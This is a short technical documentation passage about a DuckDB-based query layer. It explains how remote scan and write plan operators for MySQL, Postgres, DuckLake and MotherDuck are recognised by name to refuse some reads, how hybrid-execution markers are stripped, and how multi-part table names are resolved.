- Remote scan and write plan operators are matched by name pattern (`*_SCAN` over a table, `PG_INSERT`, `MYSQL_INSERT`, `DUCKLAKE_UPDATE`, ...). MySQL's (`MYSQL_SCAN`, `MYSQL_INSERT`, `MYSQL_CREATE_TABLE_AS`) and DuckLake's (`DUCKLAKE_SCAN`, `DUCKLAKE_INSERT`, `DUCKLAKE_UPDATE`, `DUCKLAKE_DELETE`, and `DUCKLAKE_INLINE_DATA`, the child DuckLake 1.0 adds under an insert or CREATE TABLE AS) were re-taken from a real server and a real lake on DuckDB 1.5.6 (same names as on 1.4.1 apart from `DUCKLAKE_INLINE_DATA`). MotherDuck's were taken from the extension's 1.4.1 and 1.5.6 binaries, not from a live run (`DOWNLOAD_BRIDGE`, `UPLOAD_SOURCE`, ...); 1.5.6 adds the order-preserving `BATCH_DOWNLOAD_SINK` and `BATCH_UPLOAD_SINK`, which it plans for an `ORDER BY` over a MotherDuck table (until they were listed, every such query was refused). With an `md:` catalog attached, hybrid execution marks **every** operator of every plan with where it runs (`HASH_GROUP_BY (L)` here, `SEQ_SCAN (R)` on MotherDuck's server); the marker is stripped before the name is checked (#111: before that, every read was refused while MotherDuck was attached, `count(*)` over a `data/` CSV included). A read that this layer refuses names the operator in the error.
- A three-part name whose first part is not a connection (`newsroom.raw.t`) is refused as "no connection named ...", and a four-part name (`motherduck.newsroom.raw.t`) as "a table name has at most three parts". A MotherDuck connection attaches one database; another database of the same account needs its own connection (same token).
